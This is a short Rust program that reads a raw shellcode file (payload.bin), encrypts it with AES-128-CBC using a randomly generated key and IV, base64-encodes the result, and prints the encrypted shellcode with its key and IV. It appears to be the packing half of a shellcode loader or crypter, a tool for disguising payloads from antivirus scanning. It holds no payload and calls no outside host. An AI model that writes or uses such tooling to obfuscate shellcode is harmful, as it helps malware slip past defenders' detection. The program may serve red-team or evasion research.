use std::fs::read;
use libaes::Cipher;
use rand::Rng;
pub const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
pub const RANDOM_AES_KEY: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
pub const PASSWORD_LEN: usize = 10;
pub const AES_PASSWORD_LEN: usize = 16;

fn main() {
    let shellcode = read_file(String::from("./payload.bin"));
    // println!("{:?}",shellcode);
    let (shellcode,password1,password2) = aes_base64(shellcode);
    println!("加密的shellcode:\n{}\naes key：{}\niv key: {}",shellcode,password1,password2);
}

pub fn read_file(filename: String) -> Vec<u8> {
    let shellcode = match read(filename) {
        Ok(res) => res,
        Err(err) => {
            println!("{}", err);
            std::process::exit(1);
        }
    };
    shellcode
}

pub fn aes_base64(shellcode:Vec<u8>)->(String,String,String){
    let mut rng = rand::thread_rng();
    let password1: String = (0..AES_PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..RANDOM_AES_KEY.len());
            char::from(unsafe { *RANDOM_AES_KEY.get_unchecked(idx) })
        }).collect();
    let password2: String = (0..AES_PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..RANDOM_AES_KEY.len());
            char::from(unsafe { *RANDOM_AES_KEY.get_unchecked(idx) })
        }).collect();
        let cipher = Cipher::new_128(password1.as_bytes()[0..16].try_into().unwrap());
        let shellcode = cipher.cbc_encrypt(password2.as_bytes(), &shellcode);

        let shellcode = base64_encode(shellcode);
        (shellcode,password1,password2)

}

pub fn base64_encode(shellcode: Vec<u8>) -> String {
    base64::encode(shellcode)
}